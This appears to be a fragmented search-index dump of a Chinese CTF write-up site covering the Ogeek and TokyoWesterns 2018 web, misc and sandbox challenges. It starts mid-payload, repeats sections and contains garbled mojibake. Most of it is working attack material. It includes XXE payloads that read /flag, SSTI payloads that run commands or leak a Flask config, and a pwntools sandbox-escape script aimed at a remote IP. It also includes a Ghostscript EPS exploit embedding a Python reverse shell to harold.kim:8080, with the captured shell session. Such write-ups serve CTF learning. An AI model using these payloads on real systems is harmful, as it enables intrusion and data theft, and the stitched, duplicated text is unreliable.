&#x27;file://nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd; ]> <message>any text</message> render \u00b6 \u5f00\u59cb\u4ee5\u4e3aXSS\uff0c\u4f46\u662f\u6ca1\u6210\u529f\u8fc7\u6ee4\u4e86\u5f88\u591a\u3002 \u6b63\u89e3 \u968f\u4fbf\u6d4b\u8bd5\u4e86\u4e00\u4e0b,\u53d1\u73b0[[9*9]]\u4e2d\u7684\u5185\u5bb9\u88ab\u6267\u884c\u4e86\u8f93\u51fa\u4e8649. \u642d\u914d\u9898\u76ee\u540d\u5b57render,SSTI\u6ca1\u8dd1\u4e86. \u5f88\u96be\u60f3\u5230\u8fd9\u4e9b\uff0c\u9898\u76ee\u89c1\u5c11\u4e86 \u4ece\u8fd9\u7bc7\u6587\u7ae0\u4e2d SSTI \u5f97\u5230payload\u3002\u3002 [[${T(java.lang.System).getenv()}]] \u6267\u884c\u547d\u4ee4: 1 ${T(java.lang.Runtime).getRuntime().exec('catetc/passwd')} \u4f46\u662f\u6ca1\u6709\u56de\u663e,\u6d4b\u8bd5\u4e86 nc,curl,wget \u90fd\u5f39\u4e0d\u51fa\u6765.\u4e0d\u719f\u6089java. \u76f4\u63a5\u8bfb\u6587\u4ef6: 1 [[${new[java.io](qq://txfile/#).BufferedReader(new[java.io](qq://txfile/#).FileReader(\"/flag\")).readLine()}]] misc \u00b6 2019 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 # pxy @ LAPTOP-UBIEP4K5 in /mnt/f/1.ctf/Ogeek/MISC [14:05:36] C:1 $ zsteg 2019.png --all /usr/lib/ruby/2.5.0/open3.rb:199: warning: Insecure world writable dir /mnt/c in PATH, mode 040777 imagedata .. text: \"**\\t;;\\n--\" b1,bgr,lsb,xy .. text: \"(QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA==\" b1,bgr,msb,xy .. file: raw G3 (Group 3) FAX b2,rgb,lsb,xy .. file: SoftQuad DESC or font file binary b2,rgb,msb,xy .. file: VISX image file b2,bgr,lsb,xy .. file: SoftQuad DESC or font file binary b2,bgr,msb,xy .. file: VISX image file b8,r,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,g,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,b,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) \u770b\u5230\u5b57\u7b26\u4e32 QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA== 1 2 3 # pxy @ LAPTOP-UBIEP4K5 in /mnt/f/1.ctf/Ogeek/MISC [14:05:59] $ echo 'QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA==' | base64 -d Ao(mgH[]WO,r8US3GM2R2I%YB7st% --->\u6700\u540e\u90a3\u4e2a%\u6ca1\u7528\u641e\u4e0d\u61c2Linux bash\u548b\u56de\u4e8b base85 pybox \u00b6 \u9898\u76ee\u8fd8\u5728\u641e\u4e00\u6ce2 python\u6c99\u7bb1\u9003\u9038\u7684\u77e5\u8bc6\u8fd8\u5728\u603b\u7ed3\u4e2d 1 __import__ . __getattribute__ ( 'func_clo' + 'sure' )[ 0 ] . cell_contents ( 'o' + 's' ) . __getattribute__ ( 'sy' + 'stem' )( 'sleep 5' ) \u6700\u7ec8\u7684exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from pwn import * context . log_level = \"debug\" sh = remote ( \"47.112.108.17\" , 12312 , timeout = 300 ) sh . recvuntil ( \">>>\" ) result = \"\" for i in range ( 1 , 46 ): for j in range ( 31 , 255 ): sendtime = time . time () sh . sendline ( \"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -b \" + str ( i ) + \" /home/flag`; [ $a = \\\" \" + chr ( j ) + \" \\\" ] && sleep 3 ')\" ) sh . recvuntil ( \">>>\" ) recvtime = time . time () if recvtime - sendtime > 2 : print ( \"get!\" ) result += chr ( j ) print ( result ) break if j == 254 : print ( str ( i ) + \" unknown!\" ) break print ( result ) \u53c2\u8003 \u00b6 OgeekWP \u5927\u5e08\u5085\u7684blog","title":"Ogeek"},{"location":"writeup/Ogeek/#ogeek","text":"","title":"Ogeek"},{"location":"writeup/Ogeek/#web","text":"","title":"Web"},{"location":"writeup/Ogeek/#enjoy-your-self","text":"\u6253\u5f00\u4e4b\u540e\u662f\u8fd9\u6837\u4e00\u4e2a\u9875\u9762\uff0c\u63d0\u793a time is money \u731c\u6d4b\u662f\u7ade\u4e89 \u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 <center><img src=\"../../welcome.png\"></center> <br/> <br/> <?php error_reporting ( 0 ); include \"../../utils/utils.php\" ; if ( isset ( $_REQUEST [ 'filename' ]) and preg_match ( \"/^\\w{8}$/\" , $_REQUEST [ 'filename' ])){ $filename = strtolower ( $_REQUEST [ 'filename' ]); touch ( \"backup/ { $filename } .txt\" ); unlink ( glob ( \"backup/*\" )[ 0 ]); } else { highlight_file ( __FILE__ ); } ?> \\w \u5339\u914d\u6240\u6709\u5b57\u6bcd\u6570\u5b57\uff0c\u7b49\u540c\u4e8e [a-zA-Z0-9_] \u6240\u4ee5\u6b64\u5904\u6b63\u5219\u7684\u542b\u4e49\u5c31\u662f\u5339\u914d\u6240\u6709\u5b57\u6bcd\u6570\u5b57\uff0c\u5f00\u5934\u7684\u6587\u4ef6\u540d\u3002 touch \u4f1a\u91cd\u65b0\u8bbe\u5b9a\u6587\u4ef6\u7684\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4\uff0c\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u88ab\u521b\u5efa\u3002 unlink \u51fd\u6570\u5220\u9664\u6587\u4ef6\uff0c\u6210\u529f\u65f6\u8fd4\u56de TRUE \uff0c \u6216\u8005\u5728\u5931\u8d25\u65f6\u8fd4\u56de FALSE \u3002 glob \u5bfb\u627e\u4e0e\u6a21\u5f0f\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84 \u6700\u540e\u4e00\u53e5 unlink(glob(\"backup/*\")[0]); \u5f88\u5173\u952e\uff0c\u4f60\u9700\u8981\u77e5\u9053 glob \u5217\u51fa\u7684\u6587\u4ef6\u987a\u5e8f\u662f\u600e\u6837\u7684\uff0c\u8fd9\u91cc\u8981\u8c03\u8bd5\u4e00\u4e0b \u8fd9\u91cc\u5148\u68c0\u67e5\u4e86 filename \u662f\u4e0d\u662f\u516b\u4f4d \u5927\u5c0f\u5199\u5b57\u6bcd\u6216\u8005\u6570\u5b57\u6216\u8005\u4e0b\u5212\u7ebf\u3002\u662f\u7684\u8bdd\u5c31\u521b\u5efa\u4e00\u4e2a\u8fd9\u4e2a\u540d\u5b57\u7684\u6587\u4ef6\u3002\u7136\u540e\u518d\u5217\u6587\u4ef6\uff0c\u5220\u9664\u5217\u51fa\u7684\u7b2c\u4e00\u4e2a\u6587\u4ef6\u3002\u8fd9\u91cc\u6709\u4e2a\u6709\u610f\u601d\u7684\u5730\u65b9\uff0c\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u9762\u8981\u662f\u5b58\u5728\u5176\u4ed6\u6587\u4ef6\uff0c\u90a3\u5217\u51fa\u6765\u7684\u5c31\u662f\u90a3\u4e2a\u6587\u4ef6\uff0c\u6211\u4eec\u7684\u6587\u4ef6\u5c31\u4e0d\u4f1a\u88ab\u5220\u4e86\uff0c\u5c31\u6b64\u90a3\u5c31\u53ef\u4ee5\u63a8\u6d4b\u51fa\u90a3\u4e2a\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u4e86\u3002 \u6211\u4eec\u5728\u672c\u5730\u505a\u4e2a\u5b9e\u9a8c\uff0c\u6765\u5c55\u793a\u4e00\u4e0b\u6211\u4eec\u8981\u5220\u9664\u7684\u6587\u4ef6\u3002 \u7136\u540e\u5728 backup \u4e0b\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5c31\u53eb abcdabcd \u5427\u3002 \u7136\u540e\u8bbf\u95ee\u8bd5\u8bd5 /?filename=abcdabcd\u3002 \u8fd9\u4e2a\u6587\u4ef6\u88ab\u5220\u4e86\uff0c\u4f46\u7a0b\u5e8f\u521b\u5efa\u7684abcdabcd.txt \u8fd8\u5b58\u5728\u3002 \u5728\u8fd9\u4e2a\u57fa\u7840\u4e0a\u5199\u4e2a\u811a\u672c\uff0c\u6765\u73a9\u73a9\u4eba\u8089\u4e8c\u5206\u6cd5\u5427\u3002 1 2 3 4 5 6 7 8 9 10 11 import requests filename = \"zzzzzzzz\" while True : print ( requests . get ( \"http://47.107.255.20:18088/users/977acc6365a9bc4f1c56accf1331a3bb/\" , params = { \"filename\" : filename }) . text ) r = requests . get ( \"http://47.107.255.20:18088/users/ 977acc6365a9bc4f1c56accf1331a3bb/backup/\" + filename + \".txt\" ) print ( r . status_code ) if r . status_code != 404 : print ( filename ) exit ( 0 ) \u4ece\u53ef\u7528\u5b57\u7b26\u7684\u6700\u540e\u4e00\u4f4d\u5f00\u59cb\u3002\u6d4b\u4e86\u4e0b\u670d\u52a1\u5668\u4f3c\u4e4e\u662f\u6709\u5b9a\u65f6\u91cd\u7f6e\u8fd8\u662f\u5565\u7684\u3002\u6240\u4ee5\u9700\u8981\u591a\u6b21\u5c1d\u8bd5\uff0c\u6709\u4e00\u6b21 200 \u5c31\u8bf4\u660e\u90a3\u4e2a\u6587\u4ef6\u7684\u5b57\u5178\u5e8f\u5728\u524d\u9762\u4e86\u3002 azzzzzzz\u8fd4\u56de 200\uff0c\u8bf4\u660e\u6587\u4ef6\u8fd8\u5728\u524d\u9762\u3002 \u5982\u6b64\u5f80\u590d\uff0c\u8dd1\u51fa\u524d\u4e03\u4f4d\u5b57\u7b26 aefebab\u3002\u7701\u7565\u3002\u3002\u3002\u90a3\u5c31\u8bf4\u660e\u6587\u4ef6\u540d\u662f aefebab8 \u4e86\u3002\u6253\u5f00\u770b\u770b\uff0c\u679c\u7136\u6709\u4e1c\u897f\u3002 \u8bbf\u95ee\u4e4b\u540e\u6709\u4e1c\u897f\uff1a \u53c2\u8003\u5e08\u5085\u7684\u597d\u4e86\u73af\u5883\u6ca1\u4e862333","title":"Enjoy your self"},{"location":"writeup/Ogeek/#look-around","text":"\u663e\u793a\u65f6\u95f4 \u6e90\u4ee3\u7801\u4e2d\u6709 js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 setInterval ( jishi , 1000 ); function jishi (){ var iTime = new Date (); var iYear = iTime . getFullYear (); var iMonth = iTime . getMonth (); var iDate = iTime . getDate (); var iDay = iTime . getDay (); var iHour = iTime . getHours (); var iMinute = iTime . getMinutes (); var iSecond = iTime . getSeconds (); var aPic = document . getElementsByClassName ( 'timePic' ); if ( iDay == '0' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e6\u2014\u00a5' ; } else if ( iDay == '1' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00b8\u20ac' ; } else if ( iDay == '2' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00ba\u0152' ; } else if ( iDay == '3' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00b8\u2030' ; } else if ( iDay == '4' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e5\u203a\u203a' ; } else if ( iDay == '5' ){ iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e4\u00ba\u201d' ; } else { iDay = '\u00e6\u02dc\u0178\u00e6\u0153\u0178\u00e5\u2026\u00ad' ; } var strNew = ChangeTime ( iHour ) + '' + ChangeTime ( iMinute ) + '' + ChangeTime ( iSecond ); //\u00e8\u00bd\u00ac\u00e6\u008d\u00a2\u00e4\u00b8\u00ba\u00e5\u00ad\u2014\u00e7\u00ac\u00a6\u00e4\u00b8\u00b2 for ( var i = 0 ; i < 6 ; i ++ ){ aPic [ i ]. src = 'img/' + strNew . charAt ( i ) + '.JPG' ; } } function ChangeTime ( obj ){ return obj < 10 ? ( '0' + obj ) : obj ; } \u5176\u4e2d\u8fd8\u6709\u4e00\u4e9b\u4e71\u7801 \u8def\u7531 <http://47.107.253.140:18080/webserver/js/_.js> \u6587\u4ef6\u5185\u5bb9\u4e3a\uff1a 1 2 3 4 5 var data = \"<?xml version=\\\"1.0\\\" ?>\\n<request>\\n <status>1</status>\\n</request>\" ; setInterval ( function (){ $ . post ( \"callback\" , data ); }, 10000 ); \u4f20\u9001\u7684\u6570\u636e\u5c31\u662f xml \u6293\u5305 \u4e0d\u65ad\u5730\u53d1\u9001 callback \u4e0d\u80fd\u89e3\u6790PHP\u534f\u8bae \u770b\u6765\u662f\u6709XXE\u7684\u53ef\u80fd\u4e86\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u641e \u7a81\u7136\u53d1\u73b0java\u652f\u6301\u7684\u534f\u8bae\u8fd8\u633a\u591a\u7684 \u4f46\u662f\u5e76\u6ca1\u6709\u4efb\u4f55\u56de\u663e \u4ee5\u4e0b\u662f\u6b63\u89e3 localDTD \u901a\u8fc7 localDTD \u6765\u76f2\u6253xxe \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\uff0c\u8fd9\u65f6\u5019\u53bbLinux\u91cc\u9762\u5168\u5c40\u641c\u7d22\u4e00\u4e2aDTD\u6587\u4ef6\u5373\u53ef 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?xml version=\"1.0\" ?> <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"> <!ENTITY % condition 'aaa)> aaa)> <!ENTITY &#x25; file SYSTEM \"file:///flag\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd; ]> <message>any text</message>","title":"Look around"},{"location":"writeup/Ogeek/#render","text":"\u5f00\u59cb\u4ee5\u4e3aXSS\uff0c\u4f46\u662f\u6ca1\u6210\u529f\u8fc7\u6ee4\u4e86\u5f88\u591a\u3002 \u6b63\u89e3 \u968f\u4fbf\u6d4b\u8bd5\u4e86\u4e00\u4e0b,\u53d1\u73b0[[9*9]]\u4e2d\u7684\u5185\u5bb9\u88ab\u6267\u884c\u4e86\u8f93\u51fa\u4e8649. \u642d\u914d\u9898\u76ee\u540d\u5b57render,SSTI\u6ca1\u8dd1\u4e86. \u5f88\u96be\u60f3\u5230\u8fd9\u4e9b\uff0c\u9898\u76ee\u89c1\u5c11\u4e86 \u4ece\u8fd9\u7bc7\u6587\u7ae0\u4e2d SSTI \u5f97\u5230payload\u3002\u3002 [[${T(java.lang.System).getenv()}]] \u6267\u884c\u547d\u4ee4: 1 ${T(java.lang.Runtime).getRuntime().exec('catetc/passwd')} \u4f46\u662f\u6ca1\u6709\u56de\u663e,\u6d4b\u8bd5\u4e86 nc,curl,wget \u90fd\u5f39\u4e0d\u51fa\u6765.\u4e0d\u719f\u6089java. \u76f4\u63a5\u8bfb\u6587\u4ef6: 1 [[${new[java.io](qq://txfile/#).BufferedReader(new[java.io](qq://txfile/#).FileReader(\"/flag\")).readLine()}]]","title":"render"},{"location":"writeup/Ogeek/#misc","text":"","title":"misc"},{"location":"writeup/Ogeek/#2019","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 # pxy @ LAPTOP-UBIEP4K5 in /mnt/f/1.ctf/Ogeek/MISC [14:05:36] C:1 $ zsteg 2019.png --all /usr/lib/ruby/2.5.0/open3.rb:199: warning: Insecure world writable dir /mnt/c in PATH, mode 040777 imagedata .. text: \"**\\t;;\\n--\" b1,bgr,lsb,xy .. text: \"(QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA==\" b1,bgr,msb,xy .. file: raw G3 (Group 3) FAX b2,rgb,lsb,xy .. file: SoftQuad DESC or font file binary b2,rgb,msb,xy .. file: VISX image file b2,bgr,lsb,xy .. file: SoftQuad DESC or font file binary b2,bgr,msb,xy .. file: VISX image file b8,r,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,g,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) b8,b,msb,xy .. file: RDI Acoustic Doppler Current Profiler (ADCP) \u770b\u5230\u5b57\u7b26\u4e32 QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA== 1 2 3 # pxy @ LAPTOP-UBIEP4K5 in /mnt/f/1.ctf/Ogeek/MISC [14:05:59] $ echo 'QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA==' | base64 -d Ao(mgH[]WO,r8US3GM2R2I%YB7st% --->\u6700\u540e\u90a3\u4e2a%\u6ca1\u7528\u641e\u4e0d\u61c2Linux bash\u548b\u56de\u4e8b base85","title":"2019"},{"location":"writeup/Ogeek/#pybox","text":"\u9898\u76ee\u8fd8\u5728\u641e\u4e00\u6ce2 python\u6c99\u7bb1\u9003\u9038\u7684\u77e5\u8bc6\u8fd8\u5728\u603b\u7ed3\u4e2d 1 __import__ . __getattribute__ ( 'func_clo' + 'sure' )[ 0 ] . cell_contents ( 'o' + 's' ) . __getattribute__ ( 'sy' + 'stem' )( 'sleep 5' ) \u6700\u7ec8\u7684exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from pwn import * context . log_level = \"debug\" sh = remote ( \"47.112.108.17\" , 12312 , timeout = 300 ) sh . recvuntil ( \">>>\" ) result = \"\" for i in range ( 1 , 46 ): for j in range ( 31 , 255 ): sendtime = time . time () sh . sendline ( \"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -b \" + str ( i ) + \" /home/flag`; [ $a = \\\" \" + chr ( j ) + \" \\\" ] && sleep 3 ')\" ) sh . recvuntil ( \">>>\" ) recvtime = time . time () if recvtime - sendtime > 2 : print ( \"get!\" ) result += chr ( j ) print ( result ) break if j == 254 : print ( str ( i ) + \" unknown!\" ) break print ( result )","title":"pybox"},{"location":"writeup/Ogeek/#_1","text":"OgeekWP \u5927\u5e08\u5085\u7684blog","title":"\u53c2\u8003"},{"location":"writeup/TokyoCTF/","text":"\u4e1c\u4eacCTF wp2018 \u00b6 \u9898\u76ee\u4ed3\u5e93 writeup writeup shrine \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import flask import os app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = os . environ . pop ( 'FLAG' ) @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): def safe_jinja ( s ): s = s . replace ( '(' , '' ) . replace ( ')' , '' ) blacklist = [ 'config' , 'self' ] return '' . join ([ '{{ % s et {}=None%}}' . format ( c ) for c in blacklist ]) + s return flask . render_template_string ( safe_jinja ( shrine )) if __name__ == '__main__' : app . run ( debug = True ) Although config and self are unset, request is still available. I believed that app.config may be somewhere.. To search for it, I wrote a function to traverse over child attributes of request recursively: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # search.py def search ( obj , max_depth ): visited_clss = [] visited_objs = [] def visit ( obj , path = 'obj' , depth = 0 ): yield path , obj if depth == max_depth : return elif isinstance ( obj , ( int , float , bool , str , bytes )): return elif isinstance ( obj , type ): if obj in visited_clss : return visited_clss . append ( obj ) print ( obj ) else : if obj in visited_objs : return visited_objs . append ( obj ) # attributes for name in dir ( obj ): if name . startswith ( '__' ) and name . endswith ( '__' ): if name not in ( '__globals__' , '__class__' , '__self__' , '__weakref__' , '__objclass__' , '__module__' ): continue attr = getattr ( obj , name ) yield from visit ( attr , '{}.{}' . format ( path , name ), depth + 1 ) # dict values if hasattr ( obj , 'items' ) and callable ( obj . items ): try : for k , v in obj . items (): yield from visit ( v , '{}[{}]' . format ( path , repr ( k )), depth ) except : pass # items elif isinstance ( obj , ( set , list , tuple , frozenset )): for i , v in enumerate ( obj ): yield from visit ( v , '{}[{}]' . format ( path , repr ( i )), depth ) yield from visit ( obj ) \u540c\u65f6\u4fee\u6539app.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import flask import os from flask import request from search import search app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = 'TWCTF_FLAG' @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): for path , obj in search ( request , 10 ): if str ( obj ) == app . config [ 'FLAG' ]: return path if __name__ == '__main__' : app . run ( debug = True ) (tql\u8fd9\u4e2a\u5199\u7684) 1 2 3 4 5 6 7 $ python3 app . py & $ curl 0 : 5000 / shrine / 123 obj . application . __self__ . _get_data_for_json . __globals__ [ 'json' ] . JSONEncoder . default . __globals__ [ 'current_app' ] . config [ 'FLAG' ] $ curl - g \"http://shrine.chal.ctf.westerns.tokyo/shrine/{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}\" TWCTF { pray_f0r_sacred_jinja2 } \u53e6\u4e00\u79cd\u89e3\u6cd5 \u00b6 http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__}} \u7136\u540e\u641c\u7d22\uff1a After (CTRL+F)ed \u201cFlask\u201d word i just found an interesting variable called:current_app \u8bbf\u95ee\uff1a http://shrine.chal.ctf.westerns.tokyo/shrine/ > {{url_for. globals .current_app}} It means that we are in the application app.py again, so let\u2019s try to get in config now! 1 http://shrine.chal.ctf.westerns.tokyo/shrine/{{url_for.__globals__.current_app.config}} \u6210\u529f\uff01 shrine SimpleAuth \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 <?php require_once 'flag.php' ; if ( ! empty ( $_SERVER [ 'QUERY_STRING' ])) { $query = $_SERVER [ 'QUERY_STRING' ]; $res = parse_str ( $query ); if ( ! empty ( $res [ 'action' ])){ $action = $res [ 'action' ]; } } if ( $action === 'auth' ) { if ( ! empty ( $res [ 'user' ])) { $user = $res [ 'user' ]; } if ( ! empty ( $res [ 'pass' ])) { $pass = $res [ 'pass' ]; } if ( ! empty ( $user ) && ! empty ( $pass )) { $hashed_password = hash ( 'md5' , $user . $pass ); } if ( ! empty ( $hashed_password ) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e' ) { echo $flag ; } else { echo 'fail :(' ; } } else { highlight_file ( __FILE__ ); } ?> \u6784\u9020URL 1 http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e slack emoji converter \u00b6 \u5f97\u5230\u6e90\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from flask import ( Flask , render_template , request , redirect , url_for , make_response , ) from PIL import Image import tempfile import os app = Flask ( __name__ ) @app.route ( '/' ) def index (): return render_template ( 'index.html' ) @app.route ( '/source' ) def source (): return open ( __file__ ) . read () @app.route ( '/conv' , methods = [ 'POST' ]) def conv (): f = request . files . get ( 'image' , None ) if not f : return redirect ( url_for ( 'index' )) ext = f . filename . split ( '.' )[ - 1 ] fname = tempfile . mktemp ( \"emoji\" ) fname = \"{}.{}\" . format ( fname , ext ) f . save ( fname ) img = Image . open ( fname ) w , h = img . size r = 128 / max ( w , h ) newimg = img . resize (( int ( w * r ), int ( h * r ))) newimg . save ( fname ) response = make_response () response . data = open ( fname , \"rb\" ) . read () response . headers [ 'Content-Disposition' ] = 'attachment; filename=emoji_{}' . format ( f . filename ) os . unlink ( fname ) return response if __name__ == '__main__' : app . run ( host = \"0.0.0.0\" , port = 8080 , debug = True ) it uses the PIL library which has been known to have RCEs by maliciously crafting image ( CVE-2017-8291 ). I\u2019ve been searching on google and found this interesting issue request that was written in seclists.org last month. 1 2 3 4 5 6 7 8 9 10 %!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 30 30 userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"harold.kim\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);') currentdevice putdeviceprops The result? well\u2026 1 2 3 4 5 6 7 8 9 root@imouto-router:/# nc -vlp 8080 Listening on [0.0.0.0] (family 0, port 8080) Connection from 45.123.200.35.bc.googleusercontent.com 53674 received! /bin/sh: 0: can't access tty; job control turned off $ cat /flag TWCTF{watch_0ut_gh0stscr1pt_everywhere}$ id uid=1000(emoji) gid=1000(emoji) groups=1000(emoji) $ exit root@imouto-router:/# (\u4e0d\u7406\u89e3) pysandbox1 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 import sys import ast blacklist = [ ast . Call , ast . Attribute ] def check ( node ): if isinstance ( node , list ): return all ([ check ( n ) for n in node ]) else : \"\"\" expr = BoolOp(boolop op, expr* values) | BinOp(expr left, operator op, expr right) | UnaryOp(unaryop op, expr operand) | Lambda(arguments args, expr body) | IfExp(expr test, expr body, expr orelse) | Dict(expr* keys, expr* values) | Set(expr* elts) | ListComp(expr elt, comprehension* generators) | SetComp(expr elt, comprehension* generators) | DictComp(expr key, expr value, comprehension* generators) | GeneratorExp(expr elt, comprehension* generators) -- the grammar constrains where yield expressions can occur | Yield(expr? value) -- need sequences for compare to distinguish between -- x < 4 < 3 and (x < 4) < 3 | Compare(expr left, cmpop* ops, expr* comparators) | Call(expr func, expr* args, keyword* keywords, expr? starargs, expr? kwargs) | Repr(expr value) | Num(object n) -- a number as a PyObject. | Str(string s) -- need to specify raw, unicode, etc? -- other literals? bools? -- the following expression can appear in assignment context | Attribute(expr value, identifier attr, expr_context ctx) | Subscript(expr value, slice slice, expr_context ctx) | Name(identifier id, expr_context ctx) | List(expr* elts, expr_context ctx) | Tuple(expr* elts, expr_context ctx) -- col_offset is the byte offset in the utf8 string the parser uses attributes (int lineno, int col_offset) \"\"\" attributes = { 'BoolOp' : [ 'values' ], 'BinOp' : [ 'left' , 'right' ], 'UnaryOp' : [ 'operand' ], 'Lambda' : [ 'body' ], 'IfExp' : [ 'test' , 'body' , 'orelse' ], 'Dict' : [ 'keys' , 'values' ], 'Set' : [ 'elts' ], 'ListComp' : [ 'elt' ], 'SetComp' : [ 'elt' ], 'DictComp' : [ 'key' , 'value' ], 'GeneratorExp' : [ 'elt' ], 'Yield' : [ 'value' ], 'Compare' : [ 'left' , 'comparators' ], 'Call' : False , # call is not permitted 'Repr' : [ 'value' ], 'Num' : True , 'Str' : True , 'Attribute' : False , # attribute is also not permitted 'Subscript' : [ 'value' ], 'Name' : True , 'List' : [ 'elts' ], 'Tuple' : [ 'elts' ], 'Expr' : [ 'value' ], # root node } for k , v in attributes . items (): if hasattr ( ast , k ) and isinstance ( node , getattr ( ast , k )): if isinstance ( v , bool ): return v return all ([ check ( getattr ( node , attr )) for attr in v ]) if __name__ == '__main__' : expr = sys . stdin . read () body = ast . parse ( expr ) . body if check ( body ): sys . stdout . write ( repr ( eval ( expr ))) else : sys . stdout . write ( \"Invalid input\" ) sys . stdout . flush () \u53c2\u8003 \u00b6 ctftime \u5b89\u5168\u5ba2 writeup exploitdb wp","title":"\u4e1c\u4eacCTF wp2018"},{"location":"writeup/TokyoCTF/#ctf-wp2018","text":"\u9898\u76ee\u4ed3\u5e93 writeup writeup","title":"\u4e1c\u4eacCTF wp2018"},{"location":"writeup/TokyoCTF/#shrine","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import flask import os app = flask . Flask ( __name__ ) app . config [ 'FLAG' ] = os . environ . pop ( 'FLAG' ) @app.route ( '/' ) def index (): return open ( __file__ ) . read () @app.route ( '/shrine/<path:shrine>' ) def shrine ( shrine ): def safe_jinja ( s ): s = s . replace ( '(' , '' ) . replace ( ')' , '' ) blacklist = [ 'config' , 'self' ] return '' . join ([ '{{ % s et {}=None%}}' . format ( c ) for c in blacklist ]) + s return flask . render_template_string ( safe_jinja ( shrine )) if __name__ == '__main__' : app . run ( debug = True ) Although config and self are unset, request is still available. I believed that app.config may be somewhere.. To search for it, I wrote a function to traverse over child attributes of request recursively: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # search.py def search ( obj , max_depth ): visited_clss = [] visited_objs = [] def visit ( obj , path = 'obj' , depth = 0 ): yield path , obj if depth == max_depth : return elif isinstance ( obj , ( int , float , bool , str , bytes )): return elif isinstance ( obj , type ): if obj in visited_clss : return visited_clss . append ( 